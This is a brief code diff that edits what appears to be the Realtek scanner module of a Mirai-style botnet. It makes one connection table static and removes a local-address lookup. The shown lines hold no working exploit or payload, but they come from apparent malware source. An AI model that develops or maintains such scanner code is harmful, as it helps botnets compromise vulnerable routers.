@@ -35,7 +35,7 @@
 int realtek_scanner_pid = 0, realtek_rsck = 0, realtek_rsck_out = 0, realtek_auth_table_len = 0;
 char realtek_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
 struct realtek_scanner_auth *realtek_auth_table = NULL;
-struct realtek_scanner_connection *conn_table;
+static struct realtek_scanner_connection *conn_table;
 uint16_t realtek_realtek_auth_table_max_weight = 0;
 uint32_t realtek_fake_time = 0;
 
@@ -98,7 +98,6 @@ void realtek_scanner(void)
     if(realtek_scanner_pid > 0 || realtek_scanner_pid == -1)
         return;
 
-    LOCAL_ADDR = util_local_addr();
 
     rand_init();
     realtek_fake_time = time(NULL);
